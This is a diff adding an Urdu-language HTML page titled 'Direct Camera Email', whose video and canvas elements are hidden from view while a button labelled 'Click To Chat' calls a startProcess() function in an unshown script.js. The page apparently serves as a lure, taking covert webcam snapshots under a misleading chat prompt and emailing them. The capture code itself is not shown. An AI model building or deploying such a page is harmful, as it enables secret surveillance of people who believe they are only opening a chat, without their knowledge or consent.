@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="ur">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Direct Camera Email</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="box">
+    <h2>📸   </h2>
+    
+    <!-- Camera اور Canvas چھپے ہوئے ہیں -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <button id="btn" onclick="startProcess()">
+       Click To Chat
+    </button>
+    
+    <div id="progress"></div>
+    <div id="error"></div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
